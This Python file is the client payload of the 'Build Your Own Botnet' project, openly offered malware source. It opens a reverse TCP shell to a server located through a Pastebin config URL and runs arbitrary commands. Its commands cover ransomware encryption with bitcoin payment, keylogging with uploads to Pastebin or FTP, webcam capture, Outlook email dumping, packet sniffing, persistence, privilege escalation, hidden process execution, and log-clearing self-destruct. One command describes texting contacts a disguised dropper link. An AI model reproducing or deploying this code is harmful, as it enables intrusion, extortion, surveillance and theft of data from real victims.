#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard libarary
import os
import sys
import time
import json
import zlib
import uuid
import numpy
import Queue
import base64
import ctypes
import pickle
import struct
import socket
import random
import urllib
import urllib2
import marshal
import zipfile
import logging
import itertools
import functools
import threading
import cStringIO
import subprocess
import collections
import logging.handlers

# cryptography
import Crypto.Util
import Crypto.Hash.HMAC
import Crypto.Cipher.AES
import Crypto.Hash.SHA256
import Crypto.PublicKey.RSA
import Crypto.Cipher.PKCS1_OAEP

# Windows
if os.name is 'nt':
    import wmi
    import pyHook
    import _winreg
    import win32com
    import pythoncom

# byob
    from modules import *
else:
    from . import *


class PayloadError(Exception):
    pass


class Payload():
    """
    Payload (Build Your Own Botnet)
    """
    _debug   = bool()
    _abort   = bool()

    def __init__(self, config=None, debug=True):
        """
        create a Payload instance
        """
        self._jobs      = Queue.Queue()
        self._flags     = {'connection': threading.Event(), 'mode': threading.Event(), '_prompt': threading.Event()}
        self._workers   = {}
        self._session   = {}
        self.info       = util.system_info()
        self.commands   = self._commands()


    def _commands(self):
        commands = {}
        for cmd in vars(Payload):
            if hasattr(vars(Payload)[cmd], 'command') and getattr(vars(Payload)[cmd], 'command'):
                try:
                    commands[cmd] = {
                        'method': getattr(self, cmd),
                        'platforms': getattr(Payload, cmd).platforms,
                        'usage': getattr(Payload, cmd).usage,
                        'description': getattr(Payload, cmd).func_doc.strip().rstrip()}
                except Exception as e:
                    Payload.debug("{} error: {}".format(self.commands.func_name, str(e)))
        return commands
    

    def _send(self, **kwargs):
        try:
            if self._flags['connection'].wait(timeout=1.0):
                if kwargs.get('result'):
                    buff = kwargs.get('result')
                    kwargs.update({'result': buff[:48000]})
                data = crypto.encrypt(json.dumps(kwargs), self._session['key'])
                self._session['socket'].send(struct.pack('L', len(data)) + data)
                if len(buff[48000:]):
                    kwargs.update({'result': buff[48000:]})
                    return self._send(**kwargs)
            else:
                util.debug("connection timed out")
        except Exception as e:
            util.debug('{} error: {}'.format(self._send.func_name, str(e)))


    def _recv(self, sock=None):
        try:
            if not sock:
                sock = self._session['socket']
            header_size = struct.calcsize('L')
            header = sock.recv(header_size)
            msg_len = struct.unpack('L', header)[0]
            data = ''
            while len(data) < msg_len:
                try:
                    data += sock.recv(1)
                except (socket.timeout, socket.error):
                    break
            if data and bytes(data):
                try:
                    text = crypto.decrypt(data, self._session['key'])
                    task = json.loads(text)
                    return task
                except Exception as e2:
                    util.debug('{} error: {}'.format(self._recv.func_name, str(e2)))
        except Exception as e:
            util.debug("{} error: {}".format(self._recv.func_name, str(e)))
            

    def _connect_api(self, *args, **kwargs):
        ip   = socket.gethostbyname(socket.gethostname())
        port = kwargs.get('port') if ('port' in kwargs and str(kwargs.get('port')).isdigit()) else 1337
        try:
            if not kwargs.get('debug'):
                if 'config' in kwargs:
                    url, api = urllib.urlopen(kwargs.get('config')).read().splitlines()
                    req = urllib2.Request(url)
                    req.headers = {'API-Key': api}
                    res = urllib2.urlopen(req).read()
                    try:
                        ip  = json.loads(res)['main_ip']
                        if not util.ipv4(ip):
                            util.debug("{} returned invalid IPv4 address: '{}'".format(self.get_server_addr.func_name, str(ip)))
                    except Exception as e1:
                        util.debug("{} error: {}".format(self.addr.func_name, str(e1)))
                else:
                    util.debug("{} error: missing API resources for finding active server".format(self.addr.func_name))
        except Exception as e2:
            util.debug("{} error: {}".format(self.addr.func_name, str(e2)))
            return self.restart(self.addr.func_name)
        util.debug("Connecting to {}:{}...".format(ip, port))
        return ip, port


    def _connect(self, **kwargs):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            addr = ('localhost', 1337) if not len(kwargs) else self._connect_api(**kwargs)
            sock.connect(addr)
            sock.setblocking(True)
            self._flags['connection'].set()
            return sock
        except Exception as e:
            util.debug("{} error: {}".format(self.connect.func_name, str(e)))
            return self.restart(self.connect.func_name)


    @util.threaded
    def _prompt(self, *args, **kwargs):
        self._flags['_prompt'].set()
        while True:
            try:
                self._flags['_prompt'].wait()
                self._send(**{'id': '0'*64, 'client': self.info['uid'], 'command': '_prompt', 'result': '[%d @ {}]>'.format(os.getcwd())})
                self._flags['_prompt'].clear()
            except Exception as e:
                util.debug("{} error: {}".format(self._prompt.func_name, str(e)))
                self._flags['_prompt'].clear()


    def _session_id(self):
        try:
            if self._flags['connection'].wait(timeout=3.0):
                self._session['socket'].sendall(crypto.encrypt(json.dumps(self.info), self._session['key']) + '\n')
                buf      = ""
                attempts = 1
                while '\n' not in buf:
                    try:
                        buf += self._session['socket'].recv(1024)
                    except (socket.error, socket.timeout):
                        if attempts <= 3:
                            util.debug('Attempt %d failed - no Session ID received from server\nRetrying...' % attempts)
                            attempts += 1
                            continue
                        else:
                            break
                if buf:
                    return crypto.decrypt(buf.rstrip(), self._session['key']).strip().rstrip()
            else:
                util.debug("{} timed out".format(self._session_id.func_name))
        except Exception as e:
            util.debug("{} error: {}".format(self._session_id.func_name, str(e)))
        return self.restart(self._session_id.func_name)


    @util.threaded
    def _manager(self):
        try:
            while True:
                if self.abort:
                    break
                else:
                    jobs = self._workers.items()
                    for task, worker in jobs:
                        if not worker.is_alive():
                            dead = self._workers.pop(task, None)
                            del dead
                    time.sleep(1)
        except Exception as e:
            util.debug('{} error: {}'.format(self._manager.func_name, str(e)))


    # commands


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
    def cd(self, path='.'):
        """
        change current working directory - args: pathname
        """
        try:
            if os.path.isdir(path):
                return os.chdir(path)
            else:
                return os.chdir('.')
        except Exception as e:
            util.debug("{} error: {}".format(self.cd.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
    def ls(self, path='.'):
        """
        list directory contents
        """
        try:
            output = []
            if os.path.isdir(path):
                for line in os.listdir(path):
                    if len('\n'.join(output + [line])) < 2048:
                        output.append(line)
                    else:
                        break
                return '\n'.join(output)
            else:
                return "Error: path not found"
        except Exception as e2:
            util.debug("{} error: {}".format(self.ls.func_name, str(e2)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
    def pwd(self):
        """
        show name of present working directory
        """
        try:
            return os.getcwd()
        except Exception as e:
            util.debug("{} error: {}".format(self.pwd.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
    def cat(self, path):
        """
        display file contents
        """
        try:
            output = []
            if not os.path.isfile(path):
                return "Error: file not found"
            for line in open(path, 'rb').readlines():
                try:
                    line = line.rstrip()
                    if len(line) and not line.isspace():
                        if len('\n'.join(output + [line])) < 48000:
                            output.append(line)
                        else:
                            break
                except Exception as e1:
                    util.debug("{} error: {}".format(self.cat.func_name, str(e1)))
            return '\n'.join(output)
        except Exception as e2:
            util.debug("{} error: {}".format(self.cat.func_name, str(e2))  )


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='set <cmd> [key=value]')
    def set(self, arg):
        """
        set client options
        """
        try:
            target, _, opt = arg.partition(' ')
            option, _, val = opt.partition('=')
            if val.isdigit() and int(val) in (0,1):
                val = bool(int(val))
            elif val.isdigit():
                val = int(val)
            elif val.lower() in ('true', 'on', 'enable'):
                val = True
            elif val.lower() in ('false', 'off', 'disable'):
                val = False
            elif ',' in val:
                val = val.split(',')
            if hasattr(self, target):
                try:
                    setattr(getattr(self, target), option, val)
                except:
                    try:
                        getattr(self, target).func_dict[option] = val
                    except: pass
                try:
                    return json.dumps(vars(getattr(self, target)))
                except:
                    return bytes(vars(getattr(self, target)))
            else:
                return "Target attribute '{}' not found".format(str(target))
        except Exception as e:
            util.debug("{} error: {}".format(self.set.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='sms <send/read> [args]')
    def phone(self, args):
        """
        text all host contacts with links to a dropper disguised as Google Docs invite
        """
        if 'phone' in globals():
            mode, _, args = str(args).partition(' ')
            if 'send' in mode:
                phone_number, _, message = args.partition(' ')
                return sms.text_message(phone_number, message)
            else:
                return 'usage: <send/read> [args]\n  arguments:\n\tphone    :   phone number with country code - no spaces (ex. 18001112222)\n\tmessage :   text message to send surrounded by quotes (ex. "example text message")'
        else:
            return "Error: missing module 'sms'"

    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='eval <code>')
    def eval(self, code):
        """
        execute Python code in current context
        """
        try:
            return eval(code)
        except Exception as e:
            util.debug("{} error: {}".format(self.eval.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
    def wget(self, url, filename=None):
        """
        download file from url as temporary file and return filepath
        """
        if url.startswith('http'):
            try:
                path, _ = urllib.urlretrieve(url, filename) if filename else urllib.urlretrieve(url)
                return path
            except Exception as e:
                util.debug("{} error: {}".format(self.wget.func_name, str(e)))
        else:
            return "Invalid target URL - must begin with 'http'"


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='restart [output]')
    def restart(self, output='connection'):
        """
        restart the client payload
        """
        try:
            util.debug("{} failed - restarting in 3 seconds...".format(output))
            self.kill()
            time.sleep(3)
            os.execl(sys.executable, 'python', sys.argv[0], *sys.argv[1:])
        except Exception as e:
            util.debug("{} error: {}".format(self.restart.func_name, str(e)))
            

    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
    def kill(self, debug=False):
        """
        shutdown the current connection and reset session
        """
        try:
            self._flags['connection'].clear()
            self._flags['_prompt'].clear()
            if 'socket' in self._session:
                if isinstance(self._session['socket'], socket.socket):
                    self._session['socket'].shutdown(socket.SHUT_RDWR)
                    self._session['socket'].close()
            self._session['socket'] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._session['id'] = str()
            self._session['key'] = str()
            self._session['public_key'] = str()
            _workers = self._workers.keys()
            for worker in _workers:
                try:
                    self.stop(worker)
                except Exception as e2:
                    util.debug("{} error: {}".format(self.kill.func_name, str(e2)))
        except Exception as e:
            util.debug("{} error: {}".format(self.kill.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='help')
    def help(self, cmd=None):
        """
        list commands with usage information
        """
        if not cmd:
            try:
                return json.dumps({self.commands[c]['usage']: self.commands[c]['description'] for c in self.commands})
            except Exception as e1:
                util.debug("{} error: {}".format(self.help.func_name, str(e1)))
        elif hasattr(self, str(cmd)) and '_prompt' not in cmd:
            try:
                return json.dumps({self.commands[cmd]['usage']: self.commands[cmd]['description']})
            except Exception as e2:
                util.debug("{} error: {}".format(self.help.func_name, str(e2)))
        else:
            return "Invalid command - '{}' not found".format(cmd)


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
    def show(self, attribute):
        """
        show value of an attribute
        """
        try:
            attribute = str(attribute)
            if 'jobs' in attribute:
                return json.dumps({a: util.status(self._workers[a].name) for a in self._workers if self._workers[a].is_alive()})
            elif 'privileges' in attribute:
                return json.dumps({'username': self.info.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
            elif 'info' in attribute:
                return json.dumps(self.info)
            elif hasattr(self, attribute):
                try:
                    return json.dumps(getattr(self, attribute))
                except:
                    try:
                        return json.dumps(vars(getattr(self, attribute)))
                    except: pass
            elif hasattr(self, str('_%s' % attribute)):
                try:
                    return json.dumps(getattr(self, str('_%s' % attribute)))
                except:
                    try:
                        return json.dumps(vars(getattr(self, str('_%s' % attribute))))
                    except: pass
            else:
                return self.show.usage
        except Exception as e:
            util.debug("'{}' error: {}".format(self._workers.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
    def stop(self, target):
        """
        stop a running job
        """
        try:
            if target in self._workers:
                _ = self._workers.pop(target, None)
                del _
                return "Job '{}' was stopped.".format(target)
            else:
                return "Job '{}' not found".format(target)
        except Exception as e:
            util.debug("{} error: {}".format(self.stop.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='portscan <target>')
    def portscan(self, args):
        """
        portscan the network to find online hosts and open ports
        """
        if 'portscan' not in globals():
            return "Error: missing module 'portscan'"
        try:
            mode, _, target = str(args).partition(' ')
            if target:
                if not util.ipv4(target):
                    return "Error: invalid IP address '%s'" % target
            else:
                target = socket.gethostbyname(socket.gethostname())
            if hasattr(portscan, mode):
                return getattr(portscan, mode)(target)
            else:
                return "Error: invalid mode '%s'" % mode
        except Exception as e:
            util.debug("{} error: {}".format(self.portscan.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
    def unzip(self, path):
        """
        unzip a compressed archive/file
        """
        if os.path.isfile(path):
            try:
                _ = zipfile.ZipFile(path).extractall('.')
                return os.path.splitext(path)[0]
            except Exception as e:
                util.debug("{} error: {}".format(self.unzip.func_name, str(e)))
        else:
            return "File '{}' not found".format(path)


    @util.config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
    def outlook(self, args=None):
        """
        access Outlook email without authenticating or opening the GUI
        """
        if 'outlook' not in globals():
            return "Error: missing module 'outlook'"
        elif not args:
            try:
                if not outlook.installed():
                    return "Error: Outlook not installed on this host"
                else:
                    return "Outlook is installed on this host"
            except: pass
        else:
            try:
                mode, _, arg   = str(args).partition(' ')
                if hasattr(outlook % mode):
                    if 'dump' in mode or 'upload' in mode:
                        self._workers['outlook'] = threading.Thread(target=getattr(outlook, mode), kwargs={'n': arg}, name=time.time())
                        self._workers['outlook'].daemon = True
                        self._workers['outlook'].start()
                        return "Dumping emails from Outlook inbox"
                    elif hasattr(outlook, mode):
                        return getattr(outlook, mode)()
                    else:
                        return "Error: invalid mode '%s'" % mode
                else:
                    return "usage: outlook [mode]\n    mode: count, dump, search, results"
            except Exception as e:
                util.debug("{} error: {}".format(self.email.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], registry_key=r"Software\AngryEggplant", command=True, usage='ransom <mode> [path]')
    def ransom(self, args):
        """
        encrypt personal files and ransom them
        """
        if 'ransom' not in globals():
            return "Error: missing module 'ransom'"
        elif not args:
            return "\tusage: ransom <encrypt/decrypt> [path]"
        else:
            cmd, _, action = str(args).partition(' ')
            if 'payment' in cmd:
                try:
                    return ransom.payment(action)
                except:
                    return "{} error: {}".format(Payload._ransom_payment.func_name, "bitcoin wallet required for ransom payment")
            elif 'decrypt' in cmd:
                return ransom.decrypt_threader(action)
            elif 'encrypt' in cmd:
                reg_key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, registry_key)
                return ransom.encrypt_threader(action)
            else:
                return "\tusage: ransom <mode> [path]\n\tmodes: encrypt, decrypt, payment"


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> [file]')
    def upload(self, args):
        """
        upload file to imgur, pastebin, or ftp server - mode: ftp, imgur, pastebin
        """
        try:
            mode, _, source = str(args).partition(' ')
            if not source or not hasattr(util, mode):
                return self.upload.usage
            return getattr(util, mode)(source)
        except Exception as e:
            util.debug("{} error: {}".format(self.upload.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
    def webcam(self, args=None):
        """
        stream the webcam or capture image/video - args: (image, stream, video)
        """
        try:
            if 'webcam' not in globals():
                return "Error: missing module 'webcam'"
            elif not args:
                result = self.webcam.usage
            else:
                args = str(args).split()
                if 'stream' in args:
                    if len(args) != 2:
                        result = "Error - stream mode requires argument: 'port'"
                    elif not str(args[1]).isdigit():
                        result = "Error - port must be integer between 1 - 65355"
                    else:
                        result = webcam.stream(port=args[1])
                else:
                    result = webcam.image(*args) if 'video' not in args else webcam.video(*args)
        except Exception as e:
            result = "{} error: {}".format(self.webcam.func_name, str(e))
        return result


    @util.config(platforms=['win32'], command=True, usage='escalate')
    def escalate(self):
        """
        attempt to escalate privileges
        """
        try:
            if util.administrator():
                return "Current user '{}' has administrator privileges".format(self.info.get('username'))
            if os.name is 'nt':
                win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self.clients.get('result')))
            else:
                return "Privilege escalation not yet available on '{}'".format(sys.platform)
        except Exception as e:
            util.debug("{} error: {}".format(self.escalate.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
    def execute(self, args):
        """
        run an executable program in a hidden process
        """
        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
        args = [path] + args.split()
        if os.path.isfile(path):
            name = os.path.splitext(os.path.basename(path))[0]
            try:
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
                info.wShowWindow = subprocess.SW_HIDE
                self.execute.process_list[name] = subprocess.Popen(args, startupinfo=info)
                return "Running '{}' in a hidden process".format(path)
            except Exception as e:
                try:
                    self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                    return "Running '{}' in a new process".format(name)
                except Exception as e:
                    util.debug("{} error: {}".format(self.execute.func_name, str(e)))
        else:
            return "File '{}' not found".format(str(path))


    @util.config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger start/stop/dump/status')
    def keylogger(self, mode=None):
        """
        log user keystrokes - mode; auto, run, stop, dump, status
        """
        if 'keylogger' not in globals():
            return "Error: missing module 'keylogger'"
        elif not mode:
            return keylogger.status()
        elif not mode:
            if 'keylogger' not in self._workers:
                return keylogger.usage
            else:
                return keylogger.status()
        else:
            if 'run' in mode:
                if 'keylogger' not in self._workers:
                    keylogger._workers['keylogger'] = keylogger.run()
                    return keylogger.status()
                else:
                    return keylogger.status()
            elif 'stop' in mode:
                try:
                    self.stop('keylogger')
                except: pass
                try:
                    self.stop('keylogger')
                except: pass
                return keylogger.status()
            elif 'auto' in mode:
                self._workers['keylogger'] = keylogger.auto()
                return keylogger.status()
            elif 'dump' in mode:
                result = util.pastebin(keylogger._buffer) if not 'ftp' in mode else util.ftp(keylogger._buffer)
                keylogger.buffer.reset()
                return result
            elif 'status' in mode:
                return keylogger.status()
            else:
                return keylogger.usage + '\n\targs: start, stop, dump'
            

    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='persistence add/remove [method]')
    def persistence(self, args=None):
        """
        establish persistence - methods: registry_key, scheduled_task, launch_agent, crontab_job, startup_file, hidden_file
        """
        try:
            if not 'persistence' in globals():
                return "Error: missing module 'persistence'"
            elif not args:
                return self.persistence.usage
            else:
                cmd, _, action = str(args).partition(' ')
                methods = [m for m in persistence.methods if sys.platform in persistence.methods[m]['platforms']]
                if cmd not in ('add','remove'):
                    return self.persistence.usage + str('\nmethods: %s' % ', '.join([str(m) for m in persistence.methods if sys.platform in getattr(Payload, '_persistence_add_%s' % m).platforms]))
                for method in methods:
                    if method == 'all' or action == method:
                        persistence.methods[method]['established'], persistence.methods[method]['result'] = getattr(self, '_'.join(cmd, method))()
                return json.dumps({m: persistence.methods[m]['result'] for m in methods})
        except Exception as e:
            util.debug("{} error: {}".format(self.persistence.func_name, str(e)))
        return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in persistence.methods if sys.platform in getattr(Payload, '_persistence_add_%s' % m).platforms]))


    @util.config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer mode=[str] time=[int]')
    def packetsniffer(self, args):
        """
        capture traffic on local network
        """
        try:
            if 'packetsniffer' not in globals():
                return "Error: missing module 'packetsniffer'"
            else:
                mode   = None
                length = None
                cmd, _, action = str(args).partition(' ')
                for arg in action.split():
                    if arg.isdigit():
                        length = int(arg)
                    elif arg in ('ftp','pastebin'):
                        mode   = arg
                self._workers[self.packetsniffer.func_name] = packetsniffer(mode, seconds=length)
                return 'Capturing network traffic for {} seconds'.format(duration)
        except Exception as e:
            util.debug("{} error: {}".format(self.packetsniffer.func_name, str(e)))


    @util.config(platforms=['win32'], buffer=cStringIO.StringIO(), max_bytes=1024, command=True, usage='process <mode>s')
    def process(self, args=None):
        """
        process utilities - mode: block, list, monitor, kill, search
        """
        try:
            if 'process' not in globals():
                return "Error: missing module 'process'"
            elif not args:
                return self.ps.usage
            else:
                cmd, _, action = str(args).partition(' ')
                if hasattr(process, cmd):
                    return getattr(process, cmd)(action) if action else getattr(process, cmd)()
                else:
                    return "usage: {}\n\tmode: block, list, search, kill, monitor\n\t".format(self.ps.usage)
        except Exception as e:
            util.debug("{} error: {}".format(self.process.func_name, str(e)))


    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
    def abort(self):
        """
        self-destruct and leave no trace on the disk
        """
        self.abort = True
        try:
            if os.name is 'nt':
                util.clear_system_logs()
            if 'persistence' in globals():
                for method in persistence.methods:
                    if persistence.methods[method].get('established'):
                        try:
                            remove = getattr(self, '_persistence_remove_{}'.format(method))()
                        except Exception as e2:
                            util.debug("{} error: {}".format(method, str(e2)))
            if not self.debug:
                util.delete(sys.argv[0])
        finally:
            shutdown = threading.Thread(target=self.get_shutdown)
            taskkill = threading.Thread(target=self.ps, args=('kill python',))
            shutdown.start()
            taskkill.start()
            sys.exit()


    @util.threaded
    def reverse_tcp_shell(self):
        """
        send encrypted shell back to server via outgoing TCP connection
        """
        try:
            self._workers[self._prompt.func_name] = self._prompt()
            while True:
                if self._flags['connection'].wait(timeout=1.0):
                    if not self._flags['_prompt'].is_set():
                        task = self._recv()
                        if isinstance(task, dict):
                            cmd, _, action = [i.encode() for i in task['command'].partition(' ')]
                            try:
                                result  = bytes(getattr(self, cmd)(action) if action else getattr(self, cmd)()) if cmd in sorted([attr for attr in vars(Payload) if not attr.startswith('_')]) else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                            except Exception as e1:
                                result  = "{} error: {}".format(self.reverse_tcp_shell.func_name, str(e1))
                            task.update({'result': result})
                            self._send(**task)
                            if cmd and cmd in self._flags['tasks'] and 'PRIVATE KEY' not in task['command']:
                                self.task_save(task, result)
                        self._flags['_prompt'].set()
                else:
                    util.debug("Connection timed out")
                    break
        except Exception as e2:
            util.debug("{} error: {}".format(self.reverse_tcp_shell.func_name, str(e2)))
        return self.restart(self.reverse_tcp_shell.func_name)


    def connect(self, **kwargs):
        """
        connect to server and start new session
        """
        try:
            self._session['socket'] = self._connect(**kwargs)
            self._session['key']    = crypto.diffiehellman(self._session['socket'])
            self._session['id']     = self._session_id()
            return True
        except Exception as e:
            util.debug("{} error: {}".format(self.connect.func_name, str(e)))
        return False


    def run(self, **kwargs):
        """
        run client startup routine
        """
        try:
            if self.connect(**kwargs):
                self._workers[self._manager.func_name] = self._manager()
                self._workers[self.reverse_tcp_shell.func_name] = self.reverse_tcp_shell()
            else:
                util.debug("connection timed out")
        except Exception as e:
            util.debug("{} error: {}".format(self.run.func_name, str(e)))
        return self.restart(self.run.func_name)



def main(*args, **kwargs):
    payload = Payload()
    payload.run(**kwargs)
    return payload

if __name__ == "__main__":
    payload = main(config='https://pastebin.com/raw/uYGhnVqp', debug=bool('debug' in sys.argv or '--debug' in sys.argv))
